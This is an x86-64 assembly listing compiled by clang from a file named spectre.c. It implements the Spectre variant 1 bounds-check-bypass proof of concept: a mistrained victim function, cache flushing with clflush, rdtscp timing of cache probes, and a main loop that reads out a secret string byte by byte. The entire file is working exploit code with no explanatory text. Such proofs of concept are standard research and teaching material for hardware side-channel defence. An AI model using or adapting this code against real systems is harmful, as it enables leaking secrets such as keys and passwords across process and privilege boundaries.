	.text
	.file	"spectre.c"
	.globl	check                           # -- Begin function check
	.p2align	4, 0x90
	.type	check,@function
check:                                  # @check
	.cfi_startproc
# %bb.0:
	movslq	array1_size(%rip), %rcx
	xorl	%eax, %eax
	cmpq	%rdi, %rcx
	seta	%al
	retq
.Lfunc_end0:
	.size	check, .Lfunc_end0-check
	.cfi_endproc
                                        # -- End function
	.globl	leakByteNoinlineFunction        # -- Begin function leakByteNoinlineFunction
	.p2align	4, 0x90
	.type	leakByteNoinlineFunction,@function
leakByteNoinlineFunction:               # @leakByteNoinlineFunction
	.cfi_startproc
# %bb.0:
	movl	%edi, %eax
	leaq	array2(%rip), %rcx
	movb	(%rax,%rcx), %al
	andb	%al, temp(%rip)
	retq
.Lfunc_end1:
	.size	leakByteNoinlineFunction, .Lfunc_end1-leakByteNoinlineFunction
	.cfi_endproc
                                        # -- End function
	.globl	victim_function                 # -- Begin function victim_function
	.p2align	4, 0x90
	.type	victim_function,@function
victim_function:                        # @victim_function
	.cfi_startproc
# %bb.0:
	pushq	%rax
	.cfi_def_cfa_offset 16
	movslq	array1_size(%rip), %rax
	cmpq	%rdi, %rax
	jbe	.LBB2_2
# %bb.1:
	leaq	array1(%rip), %rax
	movzbl	(%rdi,%rax), %edi
	shll	$9, %edi
	callq	leakByteNoinlineFunction
.LBB2_2:
	popq	%rax
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end2:
	.size	victim_function, .Lfunc_end2-victim_function
	.cfi_endproc
                                        # -- End function
	.globl	readMemoryByte                  # -- Begin function readMemoryByte
	.p2align	4, 0x90
	.type	readMemoryByte,@function
readMemoryByte:                         # @readMemoryByte
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rdx, 24(%rsp)                  # 8-byte Spill
	movq	%rsi, 16(%rsp)                  # 8-byte Spill
	movq	%rdi, 32(%rsp)                  # 8-byte Spill
	leaq	readMemoryByte.results(%rip), %r15
	movl	$1024, %edx                     # imm = 0x400
	movq	%r15, %rdi
	xorl	%esi, %esi
	callq	memset@PLT
	movl	$999, %r13d                     # imm = 0x3E7
	leaq	array2(%rip), %r14
	.p2align	4, 0x90
.LBB3_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB3_2 Depth 2
                                        #     Child Loop BB3_4 Depth 2
                                        #       Child Loop BB3_23 Depth 3
                                        #     Child Loop BB3_7 Depth 2
                                        #     Child Loop BB3_12 Depth 2
	movq	%r15, %rbx
	xorl	%eax, %eax
	.p2align	4, 0x90
.LBB3_2:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	clflush	(%rax,%r14)
	addq	$512, %rax                      # imm = 0x200
	cmpq	$131072, %rax                   # imm = 0x20000
	jne	.LBB3_2
# %bb.3:                                #   in Loop: Header=BB3_1 Depth=1
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
	movl	%edx, %r12d
	movq	%r12, %rbp
	xorq	32(%rsp), %rbp                  # 8-byte Folded Reload
	movl	$29, %r15d
	jmp	.LBB3_4
	.p2align	4, 0x90
.LBB3_5:                                #   in Loop: Header=BB3_4 Depth=2
	movl	%r15d, %eax
	movl	$2863311531, %ecx               # imm = 0xAAAAAAAB
	imulq	%rcx, %rax
	shrq	$34, %rax
	addl	%eax, %eax
	leal	(%rax,%rax,2), %eax
	notl	%eax
	addl	%r15d, %eax
	andl	$-65536, %eax                   # imm = 0xFFFF0000
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	%rbp, %rdi
	xorq	%r12, %rdi
	callq	victim_function
	subl	$1, %r15d
	jb	.LBB3_6
.LBB3_4:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Loop Header: Depth=2
                                        #       Child Loop BB3_23 Depth 3
	clflush	array1_size(%rip)
	movl	$0, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$99, %eax
	jg	.LBB3_5
	.p2align	4, 0x90
.LBB3_23:                               #   Parent Loop BB3_1 Depth=1
                                        #     Parent Loop BB3_4 Depth=2
                                        # =>    This Inner Loop Header: Depth=3
	addl	$1, 12(%rsp)
	movl	12(%rsp), %eax
	cmpl	$100, %eax
	jl	.LBB3_23
	jmp	.LBB3_5
	.p2align	4, 0x90
.LBB3_6:                                #   in Loop: Header=BB3_1 Depth=1
	movl	$13, %edi
	movq	%rbx, %r15
	leaq	array1(%rip), %r8
	jmp	.LBB3_7
	.p2align	4, 0x90
.LBB3_10:                               #   in Loop: Header=BB3_7 Depth=2
	addl	$167, %edi
	cmpl	$42765, %edi                    # imm = 0xA70D
	je	.LBB3_11
.LBB3_7:                                #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movzbl	%dil, %ebx
	movq	%rbx, %rbp
	shlq	$9, %rbp
	rdtscp
	movq	%rdx, %rsi
	shlq	$32, %rsi
	orq	%rax, %rsi
	movzbl	(%rbp,%r14), %eax
	rdtscp
	shlq	$32, %rdx
	orq	%rax, %rdx
	subq	%rsi, %rdx
	cmpq	$100, %rdx
	ja	.LBB3_10
# %bb.8:                                #   in Loop: Header=BB3_7 Depth=2
	movl	%r13d, %eax
	cltd
	idivl	array1_size(%rip)
                                        # kill: def $edx killed $edx def $rdx
	cmpb	(%rdx,%r8), %dil
	je	.LBB3_10
# %bb.9:                                #   in Loop: Header=BB3_7 Depth=2
	movl	%ebx, %eax
	addl	$1, (%r15,%rax,4)
	jmp	.LBB3_10
	.p2align	4, 0x90
.LBB3_11:                               #   in Loop: Header=BB3_1 Depth=1
	movl	$-1, %eax
	movq	%r15, %rdx
	xorl	%esi, %esi
	movl	$-1, %edi
	jmp	.LBB3_12
	.p2align	4, 0x90
.LBB3_13:                               #   in Loop: Header=BB3_12 Depth=2
	movl	%eax, %edi
	movl	%esi, %eax
.LBB3_18:                               #   in Loop: Header=BB3_12 Depth=2
	addq	$1, %rsi
	addq	$4, %rdx
	cmpq	$256, %rsi                      # imm = 0x100
	je	.LBB3_19
.LBB3_12:                               #   Parent Loop BB3_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	testl	%eax, %eax
	js	.LBB3_13
# %bb.14:                               #   in Loop: Header=BB3_12 Depth=2
	movl	(%rdx), %ebp
	movslq	%eax, %rbx
	cmpl	(%r15,%rbx,4), %ebp
	jge	.LBB3_13
# %bb.15:                               #   in Loop: Header=BB3_12 Depth=2
	testl	%edi, %edi
	js	.LBB3_17
# %bb.16:                               #   in Loop: Header=BB3_12 Depth=2
	movslq	%edi, %rbx
	cmpl	(%r15,%rbx,4), %ebp
	jl	.LBB3_18
.LBB3_17:                               #   in Loop: Header=BB3_12 Depth=2
	movl	%esi, %edi
	jmp	.LBB3_18
	.p2align	4, 0x90
.LBB3_19:                               #   in Loop: Header=BB3_1 Depth=1
	movslq	%eax, %rdx
	movl	(%r15,%rdx,4), %esi
	movslq	%edi, %rax
	movl	(%r15,%rax,4), %edi
	leal	(%rdi,%rdi), %ebp
	addl	$5, %ebp
	cmpl	%ebp, %esi
	jge	.LBB3_22
# %bb.20:                               #   in Loop: Header=BB3_1 Depth=1
	xorl	$2, %esi
	orl	%edi, %esi
	je	.LBB3_22
# %bb.21:                               #   in Loop: Header=BB3_1 Depth=1
	leal	-1(%r13), %esi
	cmpl	$1, %r13d
	movl	%esi, %r13d
	ja	.LBB3_1
.LBB3_22:
	xorl	%ecx, readMemoryByte.results(%rip)
	leaq	readMemoryByte.results(%rip), %rcx
	movq	16(%rsp), %rdi                  # 8-byte Reload
	movb	%dl, (%rdi)
	movl	(%rcx,%rdx,4), %edx
	movq	24(%rsp), %rsi                  # 8-byte Reload
	movl	%edx, (%rsi)
	movb	%al, 1(%rdi)
	movl	(%rcx,%rax,4), %eax
	movl	%eax, 4(%rsi)
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end3:
	.size	readMemoryByte, .Lfunc_end3-readMemoryByte
	.cfi_endproc
                                        # -- End function
	.globl	main                            # -- Begin function main
	.p2align	4, 0x90
	.type	main,@function
main:                                   # @main
	.cfi_startproc
# %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	pushq	%r15
	.cfi_def_cfa_offset 24
	pushq	%r14
	.cfi_def_cfa_offset 32
	pushq	%r13
	.cfi_def_cfa_offset 40
	pushq	%r12
	.cfi_def_cfa_offset 48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	subq	$40, %rsp
	.cfi_def_cfa_offset 96
	.cfi_offset %rbx, -56
	.cfi_offset %r12, -48
	.cfi_offset %r13, -40
	.cfi_offset %r14, -32
	.cfi_offset %r15, -24
	.cfi_offset %rbp, -16
	movq	%rsi, 32(%rsp)                  # 8-byte Spill
	movl	%edi, 20(%rsp)                  # 4-byte Spill
	movq	stdin@GOTPCREL(%rip), %rbp
	leaq	.L.str.8(%rip), %r12
	leaq	.L.str.7(%rip), %r14
	leaq	.L.str.10(%rip), %rbx
	jmp	.LBB4_1
	.p2align	4, 0x90
.LBB4_12:                               #   in Loop: Header=BB4_1 Depth=1
	xorl	%eax, %eax
	callq	getpid@PLT
	leaq	.L.str.13(%rip), %rdi
	leaq	check+33(%rip), %rsi
	movl	%eax, %edx
	xorl	%eax, %eax
	callq	printf@PLT
.LBB4_1:                                # =>This Loop Header: Depth=1
                                        #     Child Loop BB4_8 Depth 2
	movq	(%rbp), %rdi
	callq	getc@PLT
	shll	$24, %eax
	cmpl	$167772160, %eax                # imm = 0xA000000
	je	.LBB4_1
# %bb.2:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$1761607680, %eax               # imm = 0x69000000
	je	.LBB4_12
# %bb.3:                                #   in Loop: Header=BB4_1 Depth=1
	cmpl	$1912602624, %eax               # imm = 0x72000000
	jne	.LBB4_13
# %bb.4:                                #   in Loop: Header=BB4_1 Depth=1
	movq	secret(%rip), %rdx
	leaq	.L.str.1(%rip), %rdi
	movq	%rdx, %rsi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	secret(%rip), %rdi
	movq	%rdi, %rax
	leaq	array1(%rip), %rcx
	subq	%rcx, %rax
	movq	%rax, 8(%rsp)
	callq	strlen@PLT
	movl	%eax, (%rsp)
	movl	$131072, %edx                   # imm = 0x20000
	leaq	array2(%rip), %rdi
	movl	$1, %esi
	callq	memset@PLT
	cmpl	$3, 20(%rsp)                    # 4-byte Folded Reload
	jne	.LBB4_6
# %bb.5:                                #   in Loop: Header=BB4_1 Depth=1
	movq	32(%rsp), %rbp                  # 8-byte Reload
	movq	8(%rbp), %rdi
	leaq	.L.str.2(%rip), %rsi
	leaq	8(%rsp), %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 8(%rsp)
	movq	16(%rbp), %rdi
	leaq	.L.str.3(%rip), %rsi
	movq	%rsp, %rdx
	xorl	%eax, %eax
	callq	__isoc99_sscanf@PLT
	movq	8(%rsp), %rsi
	movl	(%rsp), %edx
	leaq	.L.str.4(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
.LBB4_6:                                #   in Loop: Header=BB4_1 Depth=1
	movl	(%rsp), %esi
	leaq	.L.str.5(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	testl	%eax, %eax
	jle	.LBB4_11
# %bb.7:                                #   in Loop: Header=BB4_1 Depth=1
	xorl	%r13d, %r13d
	jmp	.LBB4_8
	.p2align	4, 0x90
.LBB4_10:                               #   in Loop: Header=BB4_8 Depth=2
	movl	$10, %edi
	callq	putchar@PLT
	movl	(%rsp), %eax
	leal	-1(%rax), %ecx
	movl	%ecx, (%rsp)
	addq	$1, %r13
	testl	%eax, %eax
	jle	.LBB4_11
.LBB4_8:                                #   Parent Loop BB4_1 Depth=1
                                        # =>  This Inner Loop Header: Depth=2
	movq	8(%rsp), %rsi
	movq	secret(%rip), %rax
	movsbl	(%rax,%r13), %edx
	leaq	.L.str.6(%rip), %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movq	8(%rsp), %rdi
	leaq	1(%rdi), %rax
	movq	%rax, 8(%rsp)
	leaq	6(%rsp), %rsi
	leaq	24(%rsp), %rdx
	callq	readMemoryByte
	movl	24(%rsp), %r15d
	movl	28(%rsp), %ebp
	leal	(%rbp,%rbp), %eax
	cmpl	%eax, %r15d
	movq	%r12, %rsi
	leaq	.L.str.9(%rip), %rax
	cmovlq	%rax, %rsi
	movq	%r14, %rdi
	xorl	%eax, %eax
	callq	printf@PLT
	movzbl	6(%rsp), %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	movq	%rbx, %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%r15d, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	testl	%ebp, %ebp
	jle	.LBB4_10
# %bb.9:                                #   in Loop: Header=BB4_8 Depth=2
	movzbl	7(%rsp), %esi
	leal	-32(%rsi), %eax
	cmpb	$95, %al
	movl	$63, %edx
	cmovbl	%esi, %edx
	leaq	.L.str.11(%rip), %rdi
                                        # kill: def $esi killed $esi killed $rsi
	movl	%ebp, %ecx
	xorl	%eax, %eax
	callq	printf@PLT
	jmp	.LBB4_10
	.p2align	4, 0x90
.LBB4_11:                               #   in Loop: Header=BB4_1 Depth=1
	movq	stdin@GOTPCREL(%rip), %rbp
	jmp	.LBB4_1
.LBB4_13:
	xorl	%eax, %eax
	addq	$40, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%r12
	.cfi_def_cfa_offset 40
	popq	%r13
	.cfi_def_cfa_offset 32
	popq	%r14
	.cfi_def_cfa_offset 24
	popq	%r15
	.cfi_def_cfa_offset 16
	popq	%rbp
	.cfi_def_cfa_offset 8
	retq
.Lfunc_end4:
	.size	main, .Lfunc_end4-main
	.cfi_endproc
                                        # -- End function
	

	.ident	"Ubuntu clang version 14.0.0-1ubuntu1.1"
	.section	".note.GNU-stack","",@progbits
	.addrsig
	.addrsig_sym check
	.addrsig_sym array1_size
	.addrsig_sym array1
	.addrsig_sym array2
